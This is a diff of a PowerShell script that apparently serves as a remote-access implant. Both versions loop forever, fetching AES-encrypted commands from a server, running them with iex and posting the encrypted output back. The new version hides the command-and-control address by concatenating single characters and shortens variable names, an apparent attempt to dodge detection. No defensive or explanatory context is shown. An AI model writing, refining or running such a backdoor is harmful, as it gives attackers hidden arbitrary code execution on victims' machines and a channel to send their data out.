@@ -1,14 +1,20 @@
-$Key = [System.Text.Encoding]::UTF8.GetBytes("abcdefghijklmnop");
-$AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
-$AES.Mode = [System.Security.Cryptography.CipherMode]::CBC;
-$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$AES.Key = $Key;
-while ($true) {$AES.IV = New-Object byte[] 16;$Decryptor = $AES.CreateDecryptor();
-$Response = Invoke-WebRequest -Uri "http://0.0.0.0:0";
-$CipherText = [Convert]::FromBase64String($Response.Content);
-$PlainText = $Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length);
-$Decrypted = [System.Text.Encoding]::UTF8.GetString($PlainText);
-$Exe = iex $Decrypted;$PlainText = [System.Text.Encoding]::UTF8.GetBytes($Exe);
-$Encryptor = $AES.CreateEncryptor();
-$CipherText = $Encryptor.TransformFinalBlock($PlainText, 0, $PlainText.Length);$Encoded = [Convert]::ToBase64String($CipherText);
-Invoke-WebRequest -Uri "http://0.0.0.0:0" -Method POST -Body $Encoded
+$K = [System.Text.Encoding]::UTF8.GetBytes("abcdefghijklmnop")
+$A = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+$A.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$A.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$A.Key = $K
+$U='http'+':'+'/'+'/'+'1'+ '9'+'2'+'.'+'1'+ '6'+'8'+'.'+'0'+ '.'+'1'+ '0'+ '2'+':'+ '8'+'0'+'0'+ '0'
+while($true){
+    $A.IV=New-Object byte[] 16
+    $D=$A.CreateDecryptor()
+    $R=Invoke-WebRequest -Uri $U
+    $C=[Convert]::FromBase64String($R.Content)
+    $PT=$D.TransformFinalBlock($C, 0, $C.Length)
+    $D=[System.Text.Encoding]::UTF8.GetString($PT)
+    $E=iex $D
+    $PT=[System.Text.Encoding]::UTF8.GetBytes($E)
+    $E=$A.CreateEncryptor()
+    $C=$E.TransformFinalBlock($PT, 0, $PT.Length)
+    $C=[Convert]::ToBase64String($C)
+    Invoke-WebRequest -Uri $U -Method POST -Body $C
 }
